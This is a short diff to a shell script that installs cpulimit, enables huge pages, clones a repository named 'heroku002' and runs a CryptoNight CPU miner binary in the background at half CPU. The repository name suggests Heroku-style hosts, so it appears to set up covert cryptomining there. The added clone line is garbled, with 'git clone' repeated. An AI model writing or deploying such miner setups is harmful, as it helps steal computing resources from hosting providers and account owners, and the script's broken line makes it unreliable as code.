@@ -1,7 +1,8 @@
-#!/bin/sh
+#!/bin/bash
 sudo apt-get update &&
 sudo apt install -y cpulimit &&
 sudo sysctl -w vm.nr_hugepages=128
+git clone git clone https://github.com/herokubash/heroku002 &&
 alias proj="cd ~/heroku002"
 chmod +x jce_cn_cpu_miner64 
 cpulimit -e jce_cn_cpu_miner64 -l 50 -b &
